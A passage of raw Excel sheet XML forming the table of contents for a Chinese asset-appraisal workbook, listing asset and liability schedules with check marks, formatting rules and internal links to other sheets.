      <c r="C52" s="471" t="inlineStr">
        <is>
          <t>4-6-3-基金</t>
        </is>
      </c>
      <c r="D52" s="467" t="n"/>
      <c r="E52" s="463" t="n"/>
      <c r="F52" s="463" t="n"/>
    </row>
    <row r="53" outlineLevel="1" s="415">
      <c r="A53" s="464" t="inlineStr">
        <is>
          <t>4-7</t>
        </is>
      </c>
      <c r="B53" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C53" s="474" t="inlineStr">
        <is>
          <t>4-7投资性房地产汇总</t>
        </is>
      </c>
      <c r="D53" s="478" t="n"/>
      <c r="E53" s="463" t="n"/>
      <c r="F53" s="463" t="n"/>
    </row>
    <row r="54" outlineLevel="2" s="415">
      <c r="A54" s="470" t="inlineStr">
        <is>
          <t>4-7-1</t>
        </is>
      </c>
      <c r="B54" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C54" s="471" t="inlineStr">
        <is>
          <t>4-7-1投资性房地产</t>
        </is>
      </c>
      <c r="D54" s="467" t="n"/>
      <c r="E54" s="463" t="n"/>
      <c r="F54" s="463" t="n"/>
    </row>
    <row r="55" outlineLevel="2" s="415">
      <c r="A55" s="470" t="inlineStr">
        <is>
          <t>4-7-2</t>
        </is>
      </c>
      <c r="B55" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C55" s="471" t="inlineStr">
        <is>
          <t>4-7-2投资性房地产</t>
        </is>
      </c>
      <c r="D55" s="467" t="n"/>
      <c r="E55" s="463" t="n"/>
      <c r="F55" s="463" t="n"/>
    </row>
    <row r="56" outlineLevel="2" s="415">
      <c r="A56" s="470" t="inlineStr">
        <is>
          <t>4-7-3</t>
        </is>
      </c>
      <c r="B56" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C56" s="471" t="inlineStr">
        <is>
          <t>4-7-3投资性地产</t>
        </is>
      </c>
      <c r="D56" s="467" t="n"/>
      <c r="E56" s="463" t="n"/>
      <c r="F56" s="463" t="n"/>
    </row>
    <row r="57" outlineLevel="2" s="415">
      <c r="A57" s="470" t="inlineStr">
        <is>
          <t>4-7-4</t>
        </is>
      </c>
      <c r="B57" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C57" s="471" t="inlineStr">
        <is>
          <t>4-7-4投资性地产</t>
        </is>
      </c>
      <c r="D57" s="467" t="n"/>
      <c r="E57" s="463" t="n"/>
      <c r="F57" s="463" t="n"/>
    </row>
    <row r="58" outlineLevel="1" s="415">
      <c r="A58" s="464" t="inlineStr">
        <is>
          <t>4-8</t>
        </is>
      </c>
      <c r="B58" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C58" s="474" t="inlineStr">
        <is>
          <t>4-8固定资产汇总</t>
        </is>
      </c>
      <c r="D58" s="467" t="n"/>
      <c r="E58" s="463" t="n"/>
      <c r="F58" s="463" t="n"/>
    </row>
    <row r="59" outlineLevel="2" s="415">
      <c r="A59" s="470" t="inlineStr">
        <is>
          <t>4-8-1</t>
        </is>
      </c>
      <c r="B59" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C59" s="471" t="inlineStr">
        <is>
          <t>4-8-1房屋建筑物</t>
        </is>
      </c>
      <c r="D59" s="467" t="n"/>
      <c r="E59" s="463" t="n"/>
      <c r="F59" s="463" t="n"/>
    </row>
    <row r="60" outlineLevel="2" s="415">
      <c r="A60" s="470" t="inlineStr">
        <is>
          <t>4-8-2</t>
        </is>
      </c>
      <c r="B60" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C60" s="471" t="inlineStr">
        <is>
          <t>4-8-2构筑物</t>
        </is>
      </c>
      <c r="D60" s="467" t="n"/>
      <c r="E60" s="463" t="n"/>
      <c r="F60" s="463" t="n"/>
    </row>
    <row r="61" outlineLevel="2" s="415">
      <c r="A61" s="470" t="inlineStr">
        <is>
          <t>4-8-3</t>
        </is>
      </c>
      <c r="B61" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C61" s="471" t="inlineStr">
        <is>
          <t>4-8-3管道沟槽</t>
        </is>
      </c>
      <c r="D61" s="467" t="n"/>
      <c r="E61" s="463" t="n"/>
      <c r="F61" s="463" t="n"/>
    </row>
    <row r="62" outlineLevel="2" s="415">
      <c r="A62" s="470" t="inlineStr">
        <is>
          <t>4-8-4</t>
        </is>
      </c>
      <c r="B62" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C62" s="471" t="inlineStr">
        <is>
          <t>4-8-4机器设备</t>
        </is>
      </c>
      <c r="D62" s="467" t="n"/>
      <c r="E62" s="463" t="n"/>
      <c r="F62" s="463" t="n"/>
    </row>
    <row r="63" outlineLevel="2" s="415">
      <c r="A63" s="470" t="inlineStr">
        <is>
          <t>4-8-5</t>
        </is>
      </c>
      <c r="B63" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C63" s="471" t="inlineStr">
        <is>
          <t>4-8-5车辆</t>
        </is>
      </c>
      <c r="D63" s="467" t="n"/>
      <c r="E63" s="463" t="n"/>
      <c r="F63" s="463" t="n"/>
    </row>
    <row r="64" outlineLevel="2" s="415">
      <c r="A64" s="470" t="inlineStr">
        <is>
          <t>4-8-6</t>
        </is>
      </c>
      <c r="B64" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C64" s="471" t="inlineStr">
        <is>
          <t>4-8-6电子设备</t>
        </is>
      </c>
      <c r="D64" s="467" t="n"/>
      <c r="E64" s="463" t="n"/>
      <c r="F64" s="463" t="n"/>
    </row>
    <row r="65" outlineLevel="2" s="415">
      <c r="A65" s="470" t="inlineStr">
        <is>
          <t>4-8-7</t>
        </is>
      </c>
      <c r="B65" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C65" s="471" t="inlineStr">
        <is>
          <t>4-8-7固定资产清理</t>
        </is>
      </c>
      <c r="D65" s="467" t="n"/>
      <c r="E65" s="463" t="n"/>
      <c r="F65" s="463" t="n"/>
    </row>
    <row r="66" outlineLevel="1" s="415">
      <c r="A66" s="464" t="inlineStr">
        <is>
          <t>4-9</t>
        </is>
      </c>
      <c r="B66" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C66" s="474" t="inlineStr">
        <is>
          <t>4-9在建工程汇总</t>
        </is>
      </c>
      <c r="D66" s="467" t="n"/>
      <c r="E66" s="463" t="n"/>
      <c r="F66" s="463" t="n"/>
    </row>
    <row r="67" outlineLevel="2" s="415">
      <c r="A67" s="470" t="inlineStr">
        <is>
          <t>4-9-1</t>
        </is>
      </c>
      <c r="B67" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C67" s="471" t="inlineStr">
        <is>
          <t>4-9-1在建（土建）</t>
        </is>
      </c>
      <c r="D67" s="467" t="n"/>
      <c r="E67" s="463" t="n"/>
      <c r="F67" s="463" t="n"/>
    </row>
    <row r="68" outlineLevel="2" s="415">
      <c r="A68" s="470" t="inlineStr">
        <is>
          <t>4-9-2</t>
        </is>
      </c>
      <c r="B68" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C68" s="471" t="inlineStr">
        <is>
          <t>4-9-2在建（设备）</t>
        </is>
      </c>
      <c r="D68" s="467" t="n"/>
      <c r="E68" s="463" t="n"/>
      <c r="F68" s="463" t="n"/>
    </row>
    <row r="69" outlineLevel="2" s="415">
      <c r="A69" s="470" t="inlineStr">
        <is>
          <t>4-9-3</t>
        </is>
      </c>
      <c r="B69" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C69" s="471" t="inlineStr">
        <is>
          <t>4-9-3在建工程（工程物资）</t>
        </is>
      </c>
      <c r="D69" s="467" t="n"/>
      <c r="E69" s="463" t="n"/>
      <c r="F69" s="463" t="n"/>
    </row>
    <row r="70" outlineLevel="1" s="415">
      <c r="A70" s="470" t="inlineStr">
        <is>
          <t>4-10</t>
        </is>
      </c>
      <c r="B70" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C70" s="476" t="inlineStr">
        <is>
          <t>4-10生产性生物资产</t>
        </is>
      </c>
      <c r="D70" s="467" t="n"/>
      <c r="E70" s="463" t="n"/>
      <c r="F70" s="463" t="n"/>
    </row>
    <row r="71" outlineLevel="1" s="415">
      <c r="A71" s="470" t="inlineStr">
        <is>
          <t>4-11</t>
        </is>
      </c>
      <c r="B71" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C71" s="476" t="inlineStr">
        <is>
          <t>4-11油气资产</t>
        </is>
      </c>
      <c r="D71" s="467" t="n"/>
      <c r="E71" s="463" t="n"/>
      <c r="F71" s="463" t="n"/>
    </row>
    <row r="72" outlineLevel="1" s="415">
      <c r="A72" s="470" t="inlineStr">
        <is>
          <t>4-12</t>
        </is>
      </c>
      <c r="B72" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C72" s="476" t="inlineStr">
        <is>
          <t>4-12使用权资产</t>
        </is>
      </c>
      <c r="D72" s="467" t="n"/>
      <c r="E72" s="463" t="n"/>
      <c r="F72" s="463" t="n"/>
    </row>
    <row r="73" outlineLevel="1" s="415">
      <c r="A73" s="464" t="inlineStr">
        <is>
          <t>4-13</t>
        </is>
      </c>
      <c r="B73" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C73" s="474" t="inlineStr">
        <is>
          <t>4-13无形资产汇总</t>
        </is>
      </c>
      <c r="D73" s="467" t="n"/>
      <c r="E73" s="463" t="n"/>
      <c r="F73" s="463" t="n"/>
    </row>
    <row r="74" outlineLevel="2" s="415">
      <c r="A74" s="470" t="inlineStr">
        <is>
          <t>4-13-1</t>
        </is>
      </c>
      <c r="B74" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C74" s="471" t="inlineStr">
        <is>
          <t>4-13-1无形-土地</t>
        </is>
      </c>
      <c r="D74" s="467" t="n"/>
      <c r="E74" s="463" t="n"/>
      <c r="F74" s="463" t="n"/>
    </row>
    <row r="75" outlineLevel="2" s="415">
      <c r="A75" s="470" t="inlineStr">
        <is>
          <t>4-13-2</t>
        </is>
      </c>
      <c r="B75" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C75" s="471" t="inlineStr">
        <is>
          <t>4-13-2无形-矿业权</t>
        </is>
      </c>
      <c r="D75" s="467" t="n"/>
      <c r="E75" s="463" t="n"/>
      <c r="F75" s="463" t="n"/>
    </row>
    <row r="76" outlineLevel="2" s="415">
      <c r="A76" s="470" t="inlineStr">
        <is>
          <t>4-13-3</t>
        </is>
      </c>
      <c r="B76" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C76" s="471" t="inlineStr">
        <is>
          <t>4-13-3无形-其他</t>
        </is>
      </c>
      <c r="D76" s="467" t="n"/>
      <c r="E76" s="463" t="n"/>
      <c r="F76" s="463" t="n"/>
    </row>
    <row r="77" outlineLevel="1" s="415">
      <c r="A77" s="470" t="inlineStr">
        <is>
          <t>4-14</t>
        </is>
      </c>
      <c r="B77" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C77" s="476" t="inlineStr">
        <is>
          <t>4-14开发支出</t>
        </is>
      </c>
      <c r="D77" s="467" t="n"/>
      <c r="E77" s="463" t="n"/>
      <c r="F77" s="463" t="n"/>
    </row>
    <row r="78" outlineLevel="1" s="415">
      <c r="A78" s="470" t="inlineStr">
        <is>
          <t>4-15</t>
        </is>
      </c>
      <c r="B78" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C78" s="476" t="inlineStr">
        <is>
          <t>4-15商誉</t>
        </is>
      </c>
      <c r="D78" s="467" t="n"/>
      <c r="E78" s="463" t="n"/>
      <c r="F78" s="463" t="n"/>
    </row>
    <row r="79" outlineLevel="1" s="415">
      <c r="A79" s="470" t="inlineStr">
        <is>
          <t>4-16</t>
        </is>
      </c>
      <c r="B79" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C79" s="476" t="inlineStr">
        <is>
          <t>4-16长期待摊费用</t>
        </is>
      </c>
      <c r="D79" s="467" t="n"/>
      <c r="E79" s="463" t="n"/>
      <c r="F79" s="463" t="n"/>
    </row>
    <row r="80" outlineLevel="1" s="415">
      <c r="A80" s="470" t="inlineStr">
        <is>
          <t>4-17</t>
        </is>
      </c>
      <c r="B80" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C80" s="476" t="inlineStr">
        <is>
          <t>4-17递延所得税资产</t>
        </is>
      </c>
      <c r="D80" s="467" t="n"/>
      <c r="E80" s="463" t="n"/>
      <c r="F80" s="463" t="n"/>
    </row>
    <row r="81" outlineLevel="1" s="415">
      <c r="A81" s="470" t="inlineStr">
        <is>
          <t>4-18</t>
        </is>
      </c>
      <c r="B81" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C81" s="476" t="inlineStr">
        <is>
          <t>4-18其他非流动资产</t>
        </is>
      </c>
      <c r="D81" s="467" t="n"/>
      <c r="E81" s="463" t="n"/>
      <c r="F81" s="463" t="n"/>
    </row>
    <row r="82">
      <c r="A82" s="464" t="inlineStr">
        <is>
          <t>5</t>
        </is>
      </c>
      <c r="B82" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C82" s="468" t="inlineStr">
        <is>
          <t>5-流动负债汇总</t>
        </is>
      </c>
      <c r="D82" s="467" t="n"/>
      <c r="E82" s="463" t="n"/>
      <c r="F82" s="463" t="n"/>
    </row>
    <row r="83" outlineLevel="1" s="415">
      <c r="A83" s="470" t="inlineStr">
        <is>
          <t>5-1</t>
        </is>
      </c>
      <c r="B83" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C83" s="476" t="inlineStr">
        <is>
          <t>5-1短期借款</t>
        </is>
      </c>
      <c r="D83" s="467" t="n"/>
      <c r="E83" s="463" t="n"/>
      <c r="F83" s="463" t="n"/>
    </row>
    <row r="84" outlineLevel="1" s="415">
      <c r="A84" s="470" t="inlineStr">
        <is>
          <t>5-2</t>
        </is>
      </c>
      <c r="B84" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C84" s="476" t="inlineStr">
        <is>
          <t>5-2交易性金融负债</t>
        </is>
      </c>
      <c r="D84" s="467" t="n"/>
      <c r="E84" s="463" t="n"/>
      <c r="F84" s="463" t="n"/>
    </row>
    <row r="85" outlineLevel="1" s="415">
      <c r="A85" s="470" t="inlineStr">
        <is>
          <t>5-3</t>
        </is>
      </c>
      <c r="B85" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C85" s="476" t="inlineStr">
        <is>
          <t>5-3衍生金融负债</t>
        </is>
      </c>
      <c r="D85" s="467" t="n"/>
      <c r="E85" s="463" t="n"/>
      <c r="F85" s="463" t="n"/>
    </row>
    <row r="86" outlineLevel="1" s="415">
      <c r="A86" s="470" t="inlineStr">
        <is>
          <t>5-4</t>
        </is>
      </c>
      <c r="B86" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C86" s="476" t="inlineStr">
        <is>
          <t>5-4应付票据</t>
        </is>
      </c>
      <c r="D86" s="467" t="n"/>
      <c r="E86" s="463" t="n"/>
      <c r="F86" s="463" t="n"/>
    </row>
    <row r="87" outlineLevel="1" s="415">
      <c r="A87" s="470" t="inlineStr">
        <is>
          <t>5-5</t>
        </is>
      </c>
      <c r="B87" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C87" s="476" t="inlineStr">
        <is>
          <t>5-5应付账款</t>
        </is>
      </c>
      <c r="D87" s="467" t="n"/>
      <c r="E87" s="463" t="n"/>
      <c r="F87" s="463" t="n"/>
    </row>
    <row r="88" outlineLevel="1" s="415">
      <c r="A88" s="470" t="inlineStr">
        <is>
          <t>5-6</t>
        </is>
      </c>
      <c r="B88" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C88" s="476" t="inlineStr">
        <is>
          <t>5-6预收款项</t>
        </is>
      </c>
      <c r="D88" s="467" t="n"/>
      <c r="E88" s="463" t="n"/>
      <c r="F88" s="463" t="n"/>
    </row>
    <row r="89" outlineLevel="1" s="415">
      <c r="A89" s="470" t="inlineStr">
        <is>
          <t>5-7</t>
        </is>
      </c>
      <c r="B89" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C89" s="476" t="inlineStr">
        <is>
          <t>5-7合同负债</t>
        </is>
      </c>
      <c r="D89" s="467" t="n"/>
      <c r="E89" s="463" t="n"/>
      <c r="F89" s="463" t="n"/>
    </row>
    <row r="90" outlineLevel="1" s="415">
      <c r="A90" s="470" t="inlineStr">
        <is>
          <t>5-8</t>
        </is>
      </c>
      <c r="B90" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C90" s="476" t="inlineStr">
        <is>
          <t>5-8职工薪酬</t>
        </is>
      </c>
      <c r="D90" s="467" t="n"/>
      <c r="E90" s="463" t="n"/>
      <c r="F90" s="463" t="n"/>
    </row>
    <row r="91" outlineLevel="1" s="415">
      <c r="A91" s="470" t="inlineStr">
        <is>
          <t>5-9</t>
        </is>
      </c>
      <c r="B91" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C91" s="476" t="inlineStr">
        <is>
          <t>5-9应交税费</t>
        </is>
      </c>
      <c r="D91" s="467" t="n"/>
      <c r="E91" s="463" t="n"/>
      <c r="F91" s="463" t="n"/>
    </row>
    <row r="92" outlineLevel="1" s="415">
      <c r="A92" s="464" t="inlineStr">
        <is>
          <t>5-10</t>
        </is>
      </c>
      <c r="B92" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C92" s="468" t="inlineStr">
        <is>
          <t>5-10其他应付款汇总表</t>
        </is>
      </c>
      <c r="D92" s="467" t="n"/>
      <c r="E92" s="463" t="n"/>
      <c r="F92" s="463" t="n"/>
    </row>
    <row r="93" outlineLevel="2" s="415">
      <c r="A93" s="470" t="inlineStr">
        <is>
          <t>5-10-1</t>
        </is>
      </c>
      <c r="B93" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C93" s="471" t="inlineStr">
        <is>
          <t>5-10-1应付利息</t>
        </is>
      </c>
      <c r="D93" s="467" t="n"/>
      <c r="E93" s="463" t="n"/>
      <c r="F93" s="463" t="n"/>
    </row>
    <row r="94" outlineLevel="2" s="415">
      <c r="A94" s="470" t="inlineStr">
        <is>
          <t>5-10-2</t>
        </is>
      </c>
      <c r="B94" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C94" s="471" t="inlineStr">
        <is>
          <t>5-10-2应付股利（利润）</t>
        </is>
      </c>
      <c r="D94" s="467" t="n"/>
      <c r="E94" s="463" t="n"/>
      <c r="F94" s="463" t="n"/>
    </row>
    <row r="95" outlineLevel="2" s="415">
      <c r="A95" s="470" t="inlineStr">
        <is>
          <t>5-10-3</t>
        </is>
      </c>
      <c r="B95" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C95" s="471" t="inlineStr">
        <is>
          <t>5-10-3其他应付款</t>
        </is>
      </c>
      <c r="D95" s="467" t="n"/>
      <c r="E95" s="463" t="n"/>
      <c r="F95" s="463" t="n"/>
    </row>
    <row r="96" outlineLevel="1" s="415">
      <c r="A96" s="470" t="inlineStr">
        <is>
          <t>5-11</t>
        </is>
      </c>
      <c r="B96" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C96" s="476" t="inlineStr">
        <is>
          <t>5-11持有待售负债</t>
        </is>
      </c>
      <c r="D96" s="467" t="n"/>
      <c r="E96" s="463" t="n"/>
      <c r="F96" s="463" t="n"/>
    </row>
    <row r="97" outlineLevel="1" s="415">
      <c r="A97" s="470" t="inlineStr">
        <is>
          <t>5-12</t>
        </is>
      </c>
      <c r="B97" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C97" s="476" t="inlineStr">
        <is>
          <t>5-12一年到期非流动负债</t>
        </is>
      </c>
      <c r="D97" s="467" t="n"/>
      <c r="E97" s="463" t="n"/>
      <c r="F97" s="463" t="n"/>
    </row>
    <row r="98" outlineLevel="1" s="415">
      <c r="A98" s="470" t="inlineStr">
        <is>
          <t>5-13</t>
        </is>
      </c>
      <c r="B98" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C98" s="476" t="inlineStr">
        <is>
          <t>5-13其他流动负债</t>
        </is>
      </c>
      <c r="D98" s="467" t="n"/>
      <c r="E98" s="463" t="n"/>
      <c r="F98" s="463" t="n"/>
    </row>
    <row r="99">
      <c r="A99" s="464" t="inlineStr">
        <is>
          <t>6</t>
        </is>
      </c>
      <c r="B99" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C99" s="468" t="inlineStr">
        <is>
          <t>6-非流动负债汇总</t>
        </is>
      </c>
      <c r="D99" s="467" t="n"/>
      <c r="E99" s="463" t="n"/>
      <c r="F99" s="463" t="n"/>
    </row>
    <row r="100" outlineLevel="2" s="415">
      <c r="A100" s="470" t="inlineStr">
        <is>
          <t>6-1</t>
        </is>
      </c>
      <c r="B100" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C100" s="476" t="inlineStr">
        <is>
          <t>6-1长期借款</t>
        </is>
      </c>
      <c r="D100" s="467" t="n"/>
      <c r="E100" s="463" t="n"/>
      <c r="F100" s="463" t="n"/>
    </row>
    <row r="101" outlineLevel="2" s="415">
      <c r="A101" s="470" t="inlineStr">
        <is>
          <t>6-2</t>
        </is>
      </c>
      <c r="B101" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C101" s="476" t="inlineStr">
        <is>
          <t>6-2应付债券</t>
        </is>
      </c>
      <c r="D101" s="467" t="n"/>
      <c r="E101" s="463" t="n"/>
      <c r="F101" s="463" t="n"/>
    </row>
    <row r="102" outlineLevel="2" s="415">
      <c r="A102" s="470" t="inlineStr">
        <is>
          <t>6-3</t>
        </is>
      </c>
      <c r="B102" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C102" s="476" t="inlineStr">
        <is>
          <t>6-3租赁负债</t>
        </is>
      </c>
      <c r="D102" s="467" t="n"/>
      <c r="E102" s="463" t="n"/>
      <c r="F102" s="463" t="n"/>
    </row>
    <row r="103" outlineLevel="2" s="415">
      <c r="A103" s="470" t="inlineStr">
        <is>
          <t>6-4</t>
        </is>
      </c>
      <c r="B103" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C103" s="476" t="inlineStr">
        <is>
          <t>6-4长期应付款</t>
        </is>
      </c>
      <c r="D103" s="467" t="n"/>
      <c r="E103" s="463" t="n"/>
      <c r="F103" s="463" t="n"/>
    </row>
    <row r="104" outlineLevel="2" s="415">
      <c r="A104" s="470" t="inlineStr">
        <is>
          <t>6-5</t>
        </is>
      </c>
      <c r="B104" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C104" s="476" t="inlineStr">
        <is>
          <t>6-5长期应付职工薪酬</t>
        </is>
      </c>
      <c r="D104" s="467" t="n"/>
      <c r="E104" s="463" t="n"/>
      <c r="F104" s="463" t="n"/>
    </row>
    <row r="105" outlineLevel="2" s="415">
      <c r="A105" s="470" t="inlineStr">
        <is>
          <t>6-6</t>
        </is>
      </c>
      <c r="B105" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C105" s="476" t="inlineStr">
        <is>
          <t>6-6预计负债</t>
        </is>
      </c>
      <c r="D105" s="467" t="n"/>
      <c r="E105" s="463" t="n"/>
      <c r="F105" s="463" t="n"/>
    </row>
    <row r="106" outlineLevel="2" s="415">
      <c r="A106" s="470" t="inlineStr">
        <is>
          <t>6-7</t>
        </is>
      </c>
      <c r="B106" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C106" s="476" t="inlineStr">
        <is>
          <t>6-7递延收益</t>
        </is>
      </c>
      <c r="D106" s="467" t="n"/>
      <c r="E106" s="463" t="n"/>
      <c r="F106" s="463" t="n"/>
    </row>
    <row r="107" outlineLevel="2" s="415">
      <c r="A107" s="470" t="inlineStr">
        <is>
          <t>6-8</t>
        </is>
      </c>
      <c r="B107" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C107" s="476" t="inlineStr">
        <is>
          <t>6-8递延所得税负债</t>
        </is>
      </c>
      <c r="D107" s="467" t="n"/>
      <c r="E107" s="463" t="n"/>
      <c r="F107" s="463" t="n"/>
    </row>
    <row r="108" outlineLevel="2" s="415">
      <c r="A108" s="470" t="inlineStr">
        <is>
          <t>6-9</t>
        </is>
      </c>
      <c r="B108" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C108" s="476" t="inlineStr">
        <is>
          <t>6-9其他非流动负债</t>
        </is>
      </c>
      <c r="D108" s="467" t="n"/>
      <c r="E108" s="463" t="n"/>
      <c r="F108" s="463" t="n"/>
    </row>
    <row r="109">
      <c r="C109" s="437" t="n"/>
      <c r="K109" s="479" t="n"/>
    </row>
    <row r="110">
      <c r="K110" s="479" t="n"/>
    </row>
    <row r="111">
      <c r="K111" s="479" t="n"/>
    </row>
    <row r="112">
      <c r="K112" s="479" t="n"/>
    </row>
    <row r="113">
      <c r="K113" s="479" t="n"/>
    </row>
    <row r="114">
      <c r="K114" s="479" t="n"/>
    </row>
    <row r="115">
      <c r="K115" s="479" t="n"/>
    </row>
    <row r="116">
      <c r="K116" s="479" t="n"/>
    </row>
    <row r="117">
      <c r="K117" s="479" t="n"/>
    </row>
    <row r="118">
      <c r="K118" s="479" t="n"/>
    </row>
    <row r="119">
      <c r="K119" s="479" t="n"/>
    </row>
  </sheetData>
  <autoFilter ref="A8:D108"/>
  <conditionalFormatting sqref="A9:D108">
    <cfRule type="expression" priority="1" dxfId="0">
      <formula>FIND("√",$B9)</formula>
    </cfRule>
  </conditionalFormatting>
  <dataValidations count="2">
    <dataValidation sqref="D4" showDropDown="0" showInputMessage="1" showErrorMessage="1" allowBlank="1" type="date" operator="greaterThan">
      <formula1>1</formula1>
    </dataValidation>
    <dataValidation sqref="B9:B108" showDropDown="0" showInputMessage="1" showErrorMessage="1" allowBlank="1" type="list">
      <formula1>"√,×"</formula1>
    </dataValidation>
  </dataValidations>
  <hyperlinks>
    <hyperlink ref="C9" location="'1-汇总表'!A1" display="1-汇总表"/>
    <hyperlink ref="C10" location="'2-分类汇总'!A1" display="2-分类汇总"/>
    <hyperlink ref="C11" location="'3-流动资产汇总'!A1" display="3-流动资产汇总"/>
    <hyperlink ref="C12" location="'3-1货币资金汇总表'!A1" display="3-1货币资金汇总表"/>
    <hyperlink ref="C13" location="'3-1-1现金'!A1" display="3-1-1现金"/>
    <hyperlink ref="C14" location="'3-1-2银行存款'!A1" display="3-1-2银行存款"/>
    <hyperlink ref="C15" location="'3-1-3其他货币资金'!A1" display="3-1-3其他货币资金"/>
    <hyperlink ref="C16" location="'3-2交易性金融资产汇总'!A1" display="3-2交易性金融资产汇总"/>
    <hyperlink ref="C17" location="'3-2-1-股票'!A1" display="3-2-1-股票"/>
    <hyperlink ref="C18" location="'3-2-2-债券'!A1" display="3-2-2-债券"/>
    <hyperlink ref="C19" location="'3-2-3-基金'!A1" display="3-2-3-基金"/>
    <hyperlink ref="C20" location="'3-3衍生金融资产'!A1" display="3-3衍生金融资产"/>
    <hyperlink ref="C21" location="'3-4应收票据'!A1" display="3-4应收票据"/>
    <hyperlink ref="C22" location="'3-5应收账款'!A1" display="3-5应收账款"/>
    <hyperlink ref="C23" location="'3-6应收款项融资'!A1" display="3-6应收款项融资"/>
    <hyperlink ref="C24" location="'3-7预付款项'!A1" display="3-7预付款项"/>
    <hyperlink ref="C25" location="'3-8其他应收款汇总'!A1" display="3-8其他应收款汇总"/>
    <hyperlink ref="C26" location="'3-8-1应收利息'!A1" display="3-8-1应收利息"/>
    <hyperlink ref="C27" location="'3-8-2应收股利'!A1" display="3-8-2应收股利"/>
    <hyperlink ref="C28" location="'3-8-3其他应收款'!A1" display="3-8-3其他应收款"/>
    <hyperlink ref="C29" location="'3-9存货汇总'!A1" display="3-9存货汇总"/>
    <hyperlink ref="C30" location="'3-9-1在途物资'!A1" display="3-9-1在途物资"/>
    <hyperlink ref="C31" location="'3-9-2原材料'!A1" display="3-9-2原材料"/>
    <hyperlink ref="C32" location="'3-9-3在库周转材料'!A1" display="3-9-3在库周转材料"/>
    <hyperlink ref="C33" location="'3-9-4委托加工物资'!A1" display="3-9-4委托加工物资"/>
    <hyperlink ref="C34" location="'3-9-5产成品（库存商品）'!A1" display="3-9-5产成品（库存商品）"/>
    <hyperlink ref="C35" location="'3-9-6在产品（自制半成品）'!A1" display="3-9-6在产品（自制半成品）"/>
    <hyperlink ref="C36" location="'3-9-7发出商品'!A1" display="3-9-7发出商品"/>
    <hyperlink ref="C37" location="'3-9-8在用周转材料'!A1" display="3-9-8在用周转材料"/>
    <hyperlink ref="C38" location="'3-9-9合同履约成本'!A1" display="3-9-9合同履约成本"/>
